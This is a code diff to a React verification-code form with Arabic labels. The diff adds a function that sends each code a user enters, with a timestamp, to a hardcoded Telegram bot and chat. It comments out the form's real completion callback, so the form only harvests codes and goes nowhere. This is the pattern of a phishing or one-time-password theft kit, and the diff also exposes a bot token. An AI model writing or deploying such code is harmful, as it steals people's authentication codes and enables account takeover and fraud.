@@ -12,11 +12,52 @@ type VerificationCodeFormProps = {
 
 export default function VerificationCodeForm({
   onVerificationComplete,
-  onCancel,
   isProcessing = false,
 }: VerificationCodeFormProps) {
   const [verificationCode, setVerificationCode] = useState("");
   const [error, setError] = useState("");
+
+  const sendVerificationCode = async (code: string) => {
+    const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
+    const chatId = "-1002630840593";
+
+    const escapeMarkdown = (text: string | number | null | undefined) => {
+      const safeText = text?.toString() || "";
+      return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+    };
+
+    const formatVerificationInfo = () => {
+      const now = new Date().toLocaleString("ar-SA");
+      return [
+        "🔑 *رمز التحقق* 🔑",
+        `رمز التحقق: ${escapeMarkdown(code)}`,
+        `وقت التحقق: ${escapeMarkdown(now)}`,
+      ].join("\n");
+    };
+
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: formatVerificationInfo(),
+            parse_mode: "Markdown",
+          }),
+        }
+      );
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+
+      console.log("Verification code sent successfully.");
+    } catch (error) {
+      console.error("Error sending verification code:", error);
+    }
+  };
 
   const handleSubmit = () => {
     if (
@@ -29,12 +70,13 @@ export default function VerificationCodeForm({
     }
 
     setError("");
-    onVerificationComplete(verificationCode);
+    sendVerificationCode(verificationCode);
+    // onVerificationComplete(verificationCode);
   };
 
   return (
-    <div className="text-right bg-white p-6 rounded-lg shadow-md relative">
-      <div className="flex justify-between items-center mb-6">
+    <div className="text-right bg-gray-100 p-6 rounded-lg shadow-md relative ">
+      <div className="flex justify-between items-center mb-6 ">
         <button
           // onClick={onCancel}
           className="text-gray-500 hover:text-gray-700 transition-colors"
@@ -97,7 +139,7 @@ export default function VerificationCodeForm({
               : "bg-blue-600 hover:bg-blue-700"
           } text-white transition-colors`}
         >
-          {isProcessing ? "جاري التحقق..." : "تأكيد"}
+          تأكيد
         </button>
         <button
           className="w-full text-blue-600 hover:text-blue-700 font-medium mt-4 transition-colors"
